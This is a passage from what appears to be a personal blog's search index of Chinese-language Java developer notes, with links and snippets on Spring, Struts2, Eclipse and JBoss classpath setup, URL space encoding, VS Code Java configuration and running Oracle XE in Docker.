[ssh中org.springframework.orm.hibernate4.support.OpenSessionInViewFilter的作用及配置 - 243573295 - 博客园](https://www.cnblogs.com/hwaggLee/p/5604095.html)\n\n## 其他為整理\n\n[thymeleaf的下拉框(select option)回显选中_Java_皮皮鹏的博客-CSDN博客](https://blog.csdn.net/qq_34262794/article/details/80380566)\n[Struts2 和 springMVC 的區別 - IT閱讀](https://www.itread01.com/content/1544703608.html)\n[Struts2 Spring Hibernate的工作流程及原理(整理的) | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/435210/)\n[Struts2下載文件實例 - Struts2基礎教程](http://tw.gitbook.net/struts_2/struts-2-download-file-example.html)\n[Java : How to generate serialVersionUID – Mkyong.com](https://mkyong.com/java/how-to-generate-serialversionuid/)\n[关于tomcat WEB-INF/lib下类加载顺序 - 四少啊 - 博客园](https://www.cnblogs.com/yaojf/p/9852802.html)\n[struts2對json的支持 - IT閱讀](https://www.itread01.com/content/1505151616.html)\n[SpringApplication你不知道的那些事！ - 掘金](https://juejin.im/post/5bc6a1c6f265da0acf0b102e)\n[菜鳥工程師 肉豬: Spring @Configuration作用](https://matthung0807.blogspot.com/2019/04/spring-configuration_28.html)\n[IoC - Annotation (@Configuration) - 史帝芬心得筆記](https://sites.google.com/site/stevenattw/java/spring-framework/ioc---annotation-configuration)\n[菜鳥工程師 肉豬: Spring Boot properties file value injection 屬性配置檔注入](https://matthung0807.blogspot.com/2019/08/spring-boot-properties-file-value.html)\n```java\n@SpringBootApplication\n@PropertySource(\n    value = { \"classpath:my-messages.properties\", \"classpath:other-messages.properties\" }, \n    ignoreResourceNotFound = true,\n    encoding = \"UTF-8\"\n)\npublic class DemoApplication {\n    public static void main(String[] args) {\n        ApplicationContext appCtx = SpringApplication.run(DemoApplication.class, args);\n        \n        MyMessages myMessages = appCtx.getBean(MyMessages.class);\n        OtherMessages otherMessages = appCtx.getBean(OtherMessages.class);\n        \n        myMessages.printPropertiesValue();\n        \n        System.out.println(\"-----------------------\");\n        \n        otherMessages.printPropertiesValue();\n    }\n\n}\n```\n\n[Spring Boot Bean和依赖注入 - Spring Boot教程™](https://www.yiibai.com/spring-boot/spring_boot_beans_and_dependency_injection.html)\n[Springboot2教程：@SpringBootApplication自动配置-Java知音](https://www.javazhiyin.com/28012.html)\n[整合Spring时Service层为什么不做全局包扫描详解_慕课手记](https://www.imooc.com/article/16155)\n[用最简单的语言来告诉你:SpringMVC中@Controller,@Service,@repository,@Component的用法 - HelloJava菜鸟社区](https://www.hellojava.com/a/25881.html)\n[构建工具的进化：ant, maven, gradle - 知乎](https://zhuanlan.zhihu.com/p/24429133)\n[给女朋友讲解什么是代理模式](https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&mid=2247484222&idx=1&sn=5191aca33f7b331adaef11c5e07df468&chksm=ebd7423fdca0cb29cdc59b4c79afcda9a44b9206806d2212a1b807c9f5879674934c37c250a1#rd)\n[解决错误The type List is not generic; it cannot be parameterized with arguments _Java_瓜爪牛的博客-CSDN博客](https://blog.csdn.net/zbdxcyg/article/details/71440729)\n\n## Annotation\n\n[Java注解（Annotation）原理详解_Java_心中要有一片海的专栏-CSDN博客](https://blog.csdn.net/lylwo317/article/details/52163304)\n[Java:Annotation(注解)--原理到案例 - 簡書](https://www.jianshu.com/p/28edf5352b63)\n[关于Java的Retention元注解 - 摆渡者 - OSCHINA](https://my.oschina.net/itblog/blog/1525665)\n[Java 注解之 元注解 - 知乎](https://zhuanlan.zhihu.com/p/56713785) {% asset_link web2.png 備份圖 %}\n裡面講的還滿細的!!\n\n## JAXRS\n\n[jersey - Difference between JAX-RS and Spring Rest - Stack Overflow](https://stackoverflow.com/questions/42944777/difference-between-jax-rs-and-spring-rest)\n\n[Spring MVC与JAX-RS比较与分析 - InfoQ](https://www.infoq.cn/article/springmvc_jsx-rs)\n\n\nspring version\n[2. New Features and Enhancements in Spring 3.0](https://docs.spring.io/spring/docs/3.0.x/spring-framework-reference/html/new-in-3.html)\n[[JAVA_Spring]Spring 3.2.2的各類jar說明 @ 程式開發學習之路 :: 痞客邦 ::](https://pclevinblog.pixnet.net/blog/post/314562535-spring-3.2.2%E7%9A%84%E5%90%84%E9%A1%9Ejar%E8%AA%AA%E6%98%8E)\n[Blog of Bruce: Hibernate 4.x 整合 Spring 3.x](http://javabruce.blogspot.com/2016/02/hibernate4x-spring3x.html)\n\n[Spring：3大核心版本簡介、maven與Spring4構建工程、代碼實戰 - 每日頭條](https://kknews.cc/zh-tw/code/gzvy35y.html)\n[Spring4新特性——Web开发的增强 - 《亿级流量网站架构核心技术》~ - ITeye博客](https://www.iteye.com/blog/jinnianshilongnian-1989381)\n[Spring 5.x 新特性 - 掘金](https://juejin.im/post/5c6509d9f265da2dd37c0397)\n\n## SLF4J\n\n[SLF4J使用和与Log4J对比 - 簡書](https://www.jianshu.com/p/32e2a7254c03)\n\n## java class list\n[reflection - Java - Get a list of all Classes loaded in the JVM - Stack Overflow](https://stackoverflow.com/questions/2548384/java-get-a-list-of-all-classes-loaded-in-the-jvm)\n\nJAVA_OPTS=\"$JAVA_OPTS -verbose:class\"\n\n## ejb\n\n[語言技術: EJB3 Gossip](https://openhome.cc/Gossip/EJB3Gossip/index.html)\n[[轉] EJB 3和Spring技術體系比較 - yjmyzz @ IT工程師數位筆記本 :: 痞客邦 ::](http://newgoodlooking.pixnet.net/blog/post/125466267)\n [簡單鋪設Enterprise Java Bean(EJB)的架構 @ 資訊迴圈 :: 隨意窩 Xuite日誌](https://blog.xuite.net/jialiang/programs/39229990-%E7%B0%A1%E5%96%AE%E9%8B%AA%E8%A8%ADEnterprise+Java+Bean%28EJB%29%E7%9A%84%E6%9E%B6%E6%A7%8B)\n\n ```\njava ee基本是在企業裡用的，你編程以前，要配置一大堆xml這樣子，很可能會是javaee\njava se基本都用在學校，教學，科學實驗這些，配置個maven就了不起了\njava me就是沒人用的那些...\n```\n[java ee , java se, java me 怎麼區分? - 知乎](https://www.zhihu.com/question/31455874)\n[Spring 上課筆記 (2) | Leo Yeh's Blog](https://leoyeh.me/2016/10/15/Spring-%E4%B8%8A%E8%AA%B2%E7%AD%86%E8%A8%98-2/)\n\n## sitemesh\n\n[SiteMesh初體驗 @ Jemmy Walker :: 痞客邦 ::](https://jemmywalker.pixnet.net/blog/post/38324103?m=on//////)\n[java - SiteMesh - still active? v2 vs v3? - Stack Overflow](https://stackoverflow.com/questions/3197370/sitemesh-still-active-v2-vs-v3)\n[[页面模板框架对比] Apache Tiles VS Sitemesh_Java_孤天浪雨-CSDN博客](https://blog.csdn.net/u010246789/article/details/52343526)\n[Struts2 使用SiteMesh做网页布局 - Jersey - 博客园](https://www.cnblogs.com/jersey/archive/2011/04/10/2011244.html)\n\n\n## JNDI\n\n[Spring / Hibernate / JUnit - No Hibernate Session bound to Thread - Stack Overflow](https://stackoverflow.com/questions/734614/spring-hibernate-junit-no-hibernate-session-bound-to-thread)\n\n[放棄思考: JNDI + Derby + TomEE Plus 教學](https://javatoybox.blogspot.com/2018/09/jndi-derby-tomee-plus.html)\n\n\n## ReflectionToStringBuilder\n\n[ReflectionToStringBuilder用法优缺点及一个问题和分享_Darrensty的博客-CSDN博客_reflectiontostringbuilder](https://blog.csdn.net/Darrensty/article/details/78395221)\n\n\n\n## Pretty-Print JSON in Java\n\nGSON\n\n```java\nGson gson = new GsonBuilder().setPrettyPrinting().create();\nJsonParser jp = new JsonParser();\nJsonElement je = jp.parse(uglyJSONString);\nString prettyJsonString = gson.toJson(je);\n```\n\n\n存 Java\n\n```Java\nJSONObject json = new JSONObject(jsonString); // Convert text to object\nSystem.out.println(json.toString(4)); // Print it with specified indentation\n```\n\n## 抓取檔案位置\n\n抓取編譯檔案\n\n```java\ngetClass().getClassLoader().getResource(\"main/resources/simple/xxx.xlsx\").getFile();\n```\n\n讀取程式執行路徑\n\n\n1\n\n```java\nreturn new File(MyClass.class.getProtectionDomain().getCodeSource().getLocation()\n    .toURI()).getPath();\n```\n\n[java - How to get the path of a running JAR file? - Stack Overflow](https://stackoverflow.com/questions/320542/how-to-get-the-path-of-a-running-jar-file)\n\n## Procedure \n- [oracle - Can I rollback after calling stored procedure in java test? - Stack Overflow](https://stackoverflow.com/questions/46051642/can-i-rollback-after-calling-stored-procedure-in-java-test)\n- [使用非同步處理提升資料庫更新速度-黑暗執行緒](https://blog.darkthread.net/blog/async-batch-update-performance/)\n- [寫好SQL很有必要！ - 數據分析那些事 - Medium](https://medium.com/@allaboutdataanalysis/%E5%AF%AB%E5%A5%BDsql%E5%BE%88%E6%9C%89%E5%BF%85%E8%A6%81-3206014d5422)\n- [阿肥的DB學習之路: 四月 2017](http://dboffat.blogspot.com/2017/04/?m=1)\n\n\nRxJava2+ Retrofit2\n\n* [RxJava2+ Retrofit2 簡介](https://tpu.thinkpower.com.tw/tpu/articleDetails/1306)\n\n\n[java web中po 和dto之间的使用 - 的回答 - SegmentFault 思否](https://segmentfault.com/q/1010000018530184/a-1020000018530356?sort=created)\n[项目结构介绍-博客](https://iambigboss.top/post/59663_1_1.html)\n[PO BO VO DTO POJO DAO 概念及其作用（附转换图）](http://www.360doc.cn/article/15242507_435666535.html)\n[数据模型 - 阿里规约（1） | Ironbin](http://onthink.com/2018/07/22/alibaba-models/)\n\n\n\n\n\n基礎於：Java、Amazon AWS，進行：開發，測試，佈署（Code / Infra），維運。\nSpring MVC Framework的Servlet Container 應用服務開發。\nVert.X 或 Micronaut 的微服務Microservices開發。\nThe Reactive Manifesto的Reactive Friendly程式撰寫風格（Plus)。 \n\n 基礎於：Java、Amazon AWS，進行：開發，測試，佈署（Code / Infra），維運。\nSpring MVC Framework的Servlet Container 應用服務開發。\nVert.X 或 Micronaut 的微服務Microservices開發。\nApache Kafka的事件及訊息驅動應用開發。\nThe Reactive Manifesto的Reactive Friendly程式撰寫風格（Plus)。\nCloudformation 腳本撰寫。\n懂或有意願學習：Jenkins + CodePipeline 腳本撰寫經驗。\n協助導入及實作AWS及On Premises 混合雲","tags":["struts2"],"categories":["Java"]},{"title":"有關 url 空白字符(%20和+)","url":"%2Fblog%2F2020%2F03%2F18%2F%E6%9C%89%E9%97%9C-url-%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6-20%E5%92%8C%2F","content":"\n最近做 js 測試時後發現\n我寫這麼久才注意到這個東西\n這邊小記一下\n\n簡單來說`%20`和(`+`)加號都是變成`空白鍵`\n相反的`%2B`會變成`+`\n\nhttp://httpbin.org/get?test=123%20123\n\n動手測試比較快\n\n<!--more-->\n\n> 當HTML表單中的數據被提交時，表單的域名與值被編碼並通過HTTP的GET或者POST方法甚至更古遠的email[2]把請求發送給伺服器。這裡的編碼方法採用了一個非常早期的通用的URI百分號編碼方法，並且有很多小的修改如新行規範化以及把空格符的編碼\"%20\"替換為\"+\" . 按這套方法編碼的數據的MIME類型是application/x-www-form-urlencoded, 當前仍用於（雖然非常過時了）HTML與XForms規範中. 此外，CGI規範包括了web伺服器如何解碼這類數據、利用這類數據的內容。\n\n> 如果發送的是HTTP GET請求, application/x-www-form-urlencoded數據包含在所請求URI的查詢成分中. 如果發送的是HTTP POST請求或通過email, 數據被放置在消息體中，媒體類型的名字被包含在消息的Content-Type頭內部。 \n\n\n[URL encoding the space character: + or %20? - Stack Overflow](https://stackoverflow.com/questions/1634271/url-encoding-the-space-character-or-20)\n\n[urlencode - Encoding URL query parameters in Java - Stack Overflow](https://stackoverflow.com/questions/5330104/encoding-url-query-parameters-in-java)\n\n[你所不知道 ❌ URL - 小二の伤寒杂病论 - SegmentFault 思否](https://segmentfault.com/a/1190000006063123)\n[你所不知道 ❌ PHP POST - 小二の伤寒杂病论 - SegmentFault 思否](https://segmentfault.com/a/1190000006043397)","tags":["html"],"categories":["HTML"]},{"title":"Java / Jboss 小記","url":"%2Fblog%2F2020%2F03%2F10%2FJava-Tomcat-%E5%B0%8F%E8%A8%98%2F","content":"\nTODO: 尚未整理完成\n\n最近工作需求，需要使用 Java\n這邊做一些有關 Java 雜記\n\n<!--more-->\n\n常常我們配置 Eclipse 都沒有想過 Java 運作原理\n藉著 GUI 操作我們也不知道它底下是怎麼跑的\n雖然大學有玩過用 `java -cp xxxx` 來編譯一些程式\n[go安裝筆記&gopath環境變數設定 | 程式狂想筆記](https://malagege.github.io/blog/2018/08/27/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/)\n對 classpath 只能說編譯時候可以用別的 lib(或別的class) 搭配使用\n不過我發現用 Eclipse 我不知道他是怎麼執行\n今天主要好好研究\n\n## Java\n\n### Java Jar 檔案衝突\n\n[【经验总结】Java利用iText实现PDF操作-技术-LittleblackOnline](http://littleblack.online/?thread-31.htm)\n\n最近公司 jasperreport 和 itextpdf 衝突 \n為了做 pdfwriter 做 setEncryption \n\n> PdfWriter.ENCRYPTION_AES_128\n> 允許列印,編輯，複製，簽名 加密級別：128-bit-AES\n> PdfWriter.STANDARD_ENCRYPTION_128\n> 允許列印,編輯，複製，簽名 加密級別：128-bit-RC4\n\n[【itext學習之路】-------（第三篇）對pdf文件進行加密和許可權設定 - IT閱讀](https://www.itread01.com/content/1541909906.html)\n[Java 動態載入jar和class檔案例項解析 | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/298626/)\n[Tomcat启动时classloader加载顺序 _Java_天乙贵人-CSDN博客](https://blog.csdn.net/myk_666888/article/details/5705208)\n[ClassLoader解决jar包冲突问题_JavaScript_Peter_K的专栏-CSDN博客](https://blog.csdn.net/Peter_K/article/details/1667674)\n[你必须知道的 17 个 Composer 最佳实践（已更新至 22 个） | PHP 技术论坛](https://learnku.com/php/t/7609/you-have-to-know-17-composer-best-practices-updated-to-22)\n\n但會遇到\n> java.lang.ClassNotFoundException: org.bouncycastle.asn1.DEREncodable\n\n但用另一個 jar ，jasperreport 就會有衝突\n\n簡單尋找衝突方式\n看 Maven 對應版本(Compile Dependencies )\n[ jasperreports » 6.1.0](https://mvnrepository.com/artifact/net.sf.jasperreports/jasperreports/6.1.0)→[ itext » 2.1.7](https://mvnrepository.com/artifact/com.lowagie/itext/2.1.7)→[bcprov-jdk15on 138](https://mvnrepository.com/artifact/bouncycastle/bcprov-jdk14/138)\n[itextpdf » 5.5.5](https://mvnrepository.com/artifact/com.itextpdf/itextpdf/5.5.5)→[bcprov-jdk15on 1.49](https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk15on/1.49)\n\n依照 classpath 規則，正常 jar 檔相同 namespace 只會吃到第一個，之後讀到都會被忽略\n正常解法應該要用對應版本，可以以框架為主，通常搭配的 jar 應該使用對應相同的版本會比較好\n\n當然也有找到下面方法，但我覺得不是最好的做法\n[classloader解决jar冲突隔离_Java_到西伯利亚浪-CSDN博客](https://blog.csdn.net/Memery_last/article/details/83830475)\n\n## 使用 Maven \n\n之前也有使用 Maven 但也不是很了解\n[Mave教學 | Maven 初學者中文教程](https://kentyeh.github.io/mavenStartup/index.html)\n但我這邊發現所有的套件都會在`~/.m2`\n\n也就是說，所有的 Project 都是吃一樣的 jar 檔案\n這邊真的還滿奇特\n\n不知道他 javac 是怎麼加檔案進去\n\n[javac、classpath的编译和生成Maven工程 - 简书](https://www.jianshu.com/p/86694b6fd29c) {% asset_link web1.png 備份圖 %}\n\n看上面這篇 classpath 可以放 Project 資料夾路徑沒編譯的 java? 有待確認...，不過應該沒錯\n\n[Java包管理的那些事4——Maven - 知乎](https://zhuanlan.zhihu.com/p/65388744)\n[開發中：給大家一份Maven知識整理，希望有所幫助 - 每日頭條](https://kknews.cc/zh-tw/code/nkqnleq.html)\n\n因為目前公司碰的專案沒有用到 Maven和 Gradle\n有機會接觸再補充\n\n[專案自動構建工具對比(Maven、Gradle、Ant) - IT閱讀](https://www.itread01.com/content/1545095402.html)\n[Maven 的基本概念與在 eclipse 專案實作 @ MISTECH 技術手抄本 :: 隨意窩 Xuite日誌](https://blog.xuite.net/mistech/blog/211079202-Maven+%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E8%88%87%E5%9C%A8+eclipse+%E5%B0%88%E6%A1%88%E5%AF%A6%E4%BD%9C)\n\n[SpringBoot加载外部依赖 - 简书](https://www.jianshu.com/p/a2cf2336a48c)\n[Maven和Gradle对比 - 黄博文的地盘](http://www.huangbowen.net/blog/2016/02/23/gradle-vs-maven/)\n[Eclipse wtp Deployment Assembly « Allen's Blog](http://allenwu.logdown.com/posts/4878611-eclipse-wtp-deployment-assembly)\n\n## Eclipse 相關環境設定的影響\n\n[昭佑.天翔: Eclipse Project Facet 功能](https://tomkuo139.blogspot.com/2012/01/eclipse-project-facet.html)\n[Eclipse Build Path 的理解 - IT閱讀](https://www.itread01.com/content/1514264308.html)\n\n## 部屬 java\n\n[Jenkins入门(一)_运维_weixin_43112000的博客-CSDN博客](https://blog.csdn.net/weixin_43112000/article/details/84032214)\n[Jenkins+Java+Maven+不中断服务+自动化部署+失败自动回滚_Java_weixin_43112000的博客-CSDN博客](https://blog.csdn.net/weixin_43112000/article/details/96858469)\n[基于Jenkins的JAVA持续部署环境搭建 | 大专栏](https://www.dazhuanlan.com/2019/09/25/5d8a43a62f610/)\n\n## Jboss\n\n記得要設定 JBOSS_HOME\nJBOSS_HOME = C:\\jboss-4.0.3SP1\n\n### jsp 熱加載\n\njboss-eap-7.1\\standalone\\configuration\\standalone.xml  裡面 <jsp-config>改成<jsp-config development=\"true\"/>  就能不用重啟jsp了\n\n\n### jboss 使用 eclipse 沒有 log\n\n移除 Server 我發現 log 消失了\n後來突然想到有 JBoss EAP Server 點兩下，選擇 Open Launch configuration ，然後在 VM arguments 裡最後加入 -Dorg.jboss.as.logging.per-deployment=false \n\n參考:[JBoss EAP 6.x 對於 Log4j & System.out 在 Eclipse 上 Console 顯示設定 @ MISTECH 技術手抄本 :: 痞客邦 ::](https://mistech.pixnet.net/blog/post/393201464-jboss-eap-6.x-%E5%B0%8D%E6%96%BC-log4j-%26-system.out-%E5%9C%A8-eclipse-%E4%B8%8A-cons)\n\n### java 熱加載\n\n使用 debug 模式就能做到熱加載\n\n\n### Eclipse 的 .classpath .project .settings\n\n> 從數據上我們容易看出，上面描述了工程的依賴文件：\n> \n> 源文件的具體位置（kind=\"src\"）\n> 運行的系統環境（kind=\"con\"）\n> 工程的library的具體位置信息(kind=\"lib\")\n> 在每個lib的xml子節點中，有關於它的其它配置信息（例如我配置的那個\"javadoc_location\"）\n> 項目的輸出目錄(kind=\"output\")\n> 總體上說這個文件就是配置整個工程的運行環境。\n\n[eclipse项目中的.settings .project .classpath 个人见解_开发工具_只在朝暮间的博客-CSDN博客](https://blog.csdn.net/qq_35792598/article/details/76573943)\n[除了Maven，还有一种解决jar包管理及定制的好方法 - Java开发分享 - SegmentFault 思否](https://segmentfault.com/a/1190000007721071)\n\n### Tomcat 一些事情\n\n[理解Tomcat的Classpath-常见问题以及如何解决_Java_AndyElvis的专栏-CSDN博客](https://blog.csdn.net/andyelvis/article/details/6719996)\n\n\n\n## struct2\n\n這邊簡單小記，有空再補\n\naction \n\nspa!xxx\nspa 找 xml 對照的 java\nxxx 是 method\n沒寫 xxx 預設是 execute\n\n頁面傳到 jsp 會做 setXXXX,getXXX\n\n\n## struct2 和 spring\n\n[Struts2 Spring集成_w3cschool](https://www.w3cschool.cn/struts_2/struts_spring.html)\n\n\n## Eclipse 修改檔案不用重啟 Server\n\n[eclipse配置修改代码不用重启_开发工具_小白菜-CSDN博客](https://blog.csdn.net/xingsfdz/article/details/80665896)\n[Eclipse 修改方法裡面的內容不用重啟專案 - IT閱讀](https://www.itread01.com/content/1542335343.html)\n\n[jboss + eclipse 如何設置才能不重啟服務就能自動編譯jsp - 开发者知识库](https://www.itdaan.com/tw/191c35d4309929e8a8154a0d6553bce2)\n[Java碼農清單: jboss 修改jsp ,不須重啟servers伺服器](https://taiwanjava.blogspot.com/2016/04/jboss-jsp-servers.html)\n\nhttps://tpu.thinkpower.com.tw/tpu/articleDetails/557\n\n\n## Eclipse Project clean\n\n以前開發經驗都知道 Project 執行有問題\n只需要按 Project → clean\n有找到他是清除 class 文件\n\n> 所以有些時候編譯不通過原因是沒有project->clean造成的！！！\n> eclipse > project > clean 是把 eclipse 編譯生成的 class 之類的文件刪除，以便以後再次編譯。 redeploy 是指把 web 重新部署到 tomcat， 這可能會把 jsp/html/css/js 之類的文件及 WEB-INF 目錄複製到 tomcat 或者是把整個項目導致成一個 war 複製到 tomcat。\n[eclipse中project->clean的作用是什么 - THISISPAN - 博客园](https://www.cnblogs.com/panxuejun/p/6180324.html)\n\n> 在eclipse中写JavaWeb项目时，有时候会出现代码修改了，但是执行的效果还是修改之前的，这时候clean一下就会解决问题\n> \n> 1.clean操作\n> \n> Project---->clean--->选择需要clean的项目\n> \n> ![](https://i.imgur.com/81UjZvs.png)\n> \n>  \n> \n> 2.clean原理\n> \n> eclipse为了提高效率，并不是每次启动项目都会检查插件，通过clean就是强制eclipse去检查已安装插件。\n> 我们都知道.java文件是通过编译成.class文件运行的，而clean后会删除已经编译生成的.class文件并重新部署项目。\n> 总起来将就是强制检查已安装插件，清除以前编译的信息，重新部署项目。\n> \n> 3.clean后无法正常运行\n> \n> ![](https://i.imgur.com/PFJYmNX.jpg)\n>\n> 右键项目---->properties如图，去掉Abort build when build path errors occur\n[eclipse中的clean操作 - debugger.wiki - debugger.wiki](https://www.debugger.wiki/article/html/1562671380956639)\n\n\n 發現還有 Deployment Assembly\n java Build path是編譯路徑設置,主要用來設置源代碼的編譯路徑默認是default output folder\n> ![](https://i.imgur.com/o8Y3mbk.png)\n> Web Deployment Assembly是eclipse中的發布路徑設置，DeployPath表示每個資源發佈之後的文件路徑\n> ![](https://i.imgur.com/zEmk1Tf.png)\n> \n> 理解\n> \n> eclipse中使用tomcat使用啟動web項目的流程是 java build path編譯項目源代碼生成的class文件放到buildpath的設置路徑中，根據web deployment assembly將項目中的各個資源發佈到設置的指定文件中\n[eclipse中Deployment Assembly选项设置说明_开发工具_我的世界，真实可见 -CSDN博客](https://blog.csdn.net/shiwodecuo/article/details/62040447)\n\n這樣我就突然想到之前專案設錯 Deployment Assembly 就不能執行\n不是 Web 專案是沒有 Deployment Assembly \n\n### eclipse 設定編譯出位置 .class path\n\n應該是相同路徑\n主要看.classpath\n```\n<classpathentry kind=\"src\" path=\"src\"/>\n```\n\n其他相關\n[Path to .class file in eclipse - Stack Overflow](https://stackoverflow.com/questions/17161237/path-to-class-file-in-eclipse)\n[在eclipse中使用Gradle之修改default output folder « Jason's Blog](http://jason79-blog.logdown.com/posts/256196-in-eclipse-using-gradle-to-modify-default-output-folder)\n\n#### Eclipse 看 Properties 會亂碼\n\n安裝 PropertiesEditor 就能正常\n可參考下面連結\n[Eclipse Properties 顯示中文字 | Xuan's Blog](https://coffee0127.github.io/blog/2016/08/15/eclipse-poperties/)\n[eclipse中 XXXX.properties文件 不显示中文，显示的unicode编码。_开发工具_mukvintt的博客-CSDN博客](https://blog.csdn.net/mukvintt/article/details/79746857)\n\n#### Eclipse 實用快速鍵\n\n> 重構\n> `Alt+Shift+R`: 重命名 (是我自己最愛用的一個了,尤其是變量和類的Rename,比手工方法能節省很多勞動力)\n> `Alt+Shift+M`: 抽取方法 (這是重構裡面最常用的方法之一了,尤其是對一大堆泥團代碼有用)\n> `Alt+Shift+C`: 修改函數結構(比較實用,有N個函數調用了這個方法,修改一次搞定)\n> `Alt+Shift+L`: 抽取本地變量( 可以直接把一些魔法數字和字符串抽取成一個變量,尤其是多處調用的時候)\n> `Alt+Shift+F`: 把Class中的local變量變為field變量 (比較實用的功能)\n> `Alt+Shift+I`: 合併變量(可能這樣說有點不妥Inline)\n> `Alt+Shift+V`: 移動函數和變量(不怎麼常用)\n> `Alt+Shift+Z`: 重構的後悔藥(Undo)\n\n\n參考: [Eclipse使用技巧](https://wsxq2.55555.io/blog/2018/12/12/eclipse%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/)\n\n\n## vscode 使用 web 方案\n\n### 先說明我目前用到的專案\n.classpath 底下有設定這些\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<classpath>\n\t<classpathentry kind=\"src\" path=\"src\"/>\n\t<classpathentry kind=\"con\" path=\"org.eclipse.jst.j2ee.internal.web.container\"/>\n\t<classpathentry kind=\"con\" path=\"org.eclipse.jst.j2ee.internal.module.container\"/>\n\t<classpathentry combineaccessrules=\"false\" kind=\"src\" path=\"/xxxx-common\"/>\n\t<classpathentry combineaccessrules=\"false\" kind=\"src\" path=\"/xxx-sms\"/>\n\t<classpathentry kind=\"con\" path=\"org.eclipse.jst.server.core.container/org.jboss.ide.eclipse.as.core.server.runtime.runtimeTarget/JBoss EAP 7.1 Runtime\"/>\n\t<classpathentry combineaccessrules=\"false\" kind=\"src\" path=\"/xxxx-pdf\"/>\n\t<classpathentry kind=\"con\" path=\"org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-1.8\">\n\t\t<attributes>\n\t\t\t<attribute name=\"owner.project.facets\" value=\"java\"/>\n\t\t</attributes>\n\t</classpathentry>\n\t<classpathentry kind=\"output\" path=\"build/classes\"/>\n</classpath>\n```\n\n看到 add classpath 有設定一些專案旁的 Project\nvscode 吃的到 .classpath 檔案\n但 vscode 單讀開 Project 不會吃到的樣子\n有找到下面的方法 java.project.referencedLibraries\n但還是沒用\n\n###  vscode 載入 jar 檔方法\n\n```\n\"java.project.referencedLibraries\": {\n    \"include\": [\n        \"library/**/*.jar\",\n        \"/home/username/lib/foo.jar\"\n    ],\n    \"exclude\": [\n        \"library/sources/**\"\n    ],\n    \"sources\": {\n        \"library/bar.jar\": \"library/sources/bar-src.jar\"\n    }\n}\n```\n\n[Maven Support, Java Package, and Dependency Management in Visual Studio Code](https://code.visualstudio.com/docs/java/java-project)\n\nIn case VS Code throws an error for a classpath issue, try setting your classpath manually by either setting the CLASSPATH environment variable or editing the .classpath file with the path to the JAR file:\n\n看樣子 maven 不能設定 classpath\n\n相關連結\n[Maven管理的jar没有发布到WEB-INF/lib下的解决方案_java的涟漪-CSDN博客](https://blog.csdn.net/rogerjava/article/details/23764679)\n[（三）Java资源文件和路径相关扫盲 - 知乎](https://zhuanlan.zhihu.com/p/68065612)\n[java项目中的classpath到底是什么 - 简书](https://www.jianshu.com/p/7cadd9bedf4f)\n[java - Can I add jars to maven 2 build classpath without installing them? - Stack Overflow](https://stackoverflow.com/questions/364114/can-i-add-jars-to-maven-2-build-classpath-without-installing-them)\n\n沒法對 Project 做\n但這個對我的專案沒什麼用\n\n### vsocde 對整個 workspace 開啟\n\n```xml\n<classpathentry combineaccessrules=\"false\" kind=\"src\" path=\"/xxxx-common\"/>\n```\n\n發現對整個 workspace 開啟\n程式就可以關連到 Project 程式\n手動加真的太慢了\n用 Eclipse 做設定會寫到 .classpath 檔案\n缺點還是需要手動加\n\n{% asset_img add_jar.png Eclipse加jar檔 %}\n\n這個方法是參考[[vscode] java 사용시 세팅 관련](https://min9nim.github.io/2018/05/vscode-setting/)\n原本我是想用 `*` 加入 jar 檔案\n但這邊說不能這樣設定\n使用單筆 jar 進去 vsocde就能順利認得 class\n\n\n題外話\n小記 Classpath 加 Project 時候\n發步 JBOSS 時候 WEB-INF/lib/裡面會加入到剛剛加的 Project WAR 檔\n\n\n### add project(classpath)\n\nA Project 包 jar 檔時候，被 B Project 引入時候，我發現 A project \n\n[java的打包成jar方法 - 學而時習之](https://sites.google.com/site/waue0920/Home/java/java-de-da-bao-chengjar-fang-fa#%E6%89%93%E5%8C%85%E6%88%90exe%E6%AA%94%E5%B7%A5%E5%85%B7)\n\n\n\n\n[intellij与eclipse默认快捷键对比 - 简书](https://www.jianshu.com/p/658ebd054fba)\n[Maven查找依赖树，解决jar包冲突问题_Java_Epic丶玖遇-CSDN博客](https://blog.csdn.net/keshacookie/article/details/50506428)\n[Jar 包依赖冲突排查思路和解决方法（logback + slf4j-log4j12） - 掘金](https://juejin.im/post/5ce90722f265da1bd522aa70)\n[重新看待Jar包冲突问题及解决方案 - 簡書](https://www.jianshu.com/p/100439269148)\n\n\n## ANT\n\n[[JAVA] 用Ant打包war的簡單流程 | 阿輝的零碎筆記 - 點部落](https://dotblogs.com.tw/grayyin/2016/07/26/203656)","tags":["tomcat"],"categories":["Java"]},{"title":"快速用 docker 建置 oracle 環境方法","url":"%2Fblog%2F2020%2F03%2F07%2F%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95%2F","content":"\n最近要看 DB 工具是否能正常連 Oracle\n簡單使用 Docker 來架設環境\n\n<!--more-->\n\n[componhead/docker-oracle-xe-11g: My oracle xe 11g](https://github.com/componhead/docker-oracle-xe-11g)\nbuild 上面這版`docker build . -t oracle-xe-11g`\n\n帳號密碼 system,oracle\n這樣就能進去了\n\n```yml\nversion: '2'\nservices:\n  oracle:\n    image: oracle-xe-11g\n    restart: always   #如果docker容器由于一些问题挂掉的化，docker-composer会自动把容器给启动起来\n    ports:\n      - 1521:1521\n      - 8080:8080\n```\n\ndocker-compose up -d 就可以執行環境，但要等一下時間\n\ndocker-compose logs -f 看到最後一段就可以使用了\n\n```\noracle_1  | ls: cannot access /u01/app/oracle/oradata: No such file or directory\noracle_1  | Database not initialized. Initializing database.\noracle_1  | Setting up:\noracle_1  | processes=500\noracle_1  | sessions=555\noracle_1  | transactions=610\noracle_1  | If you want to use different parameters set processes, sessions, transactions env variables and 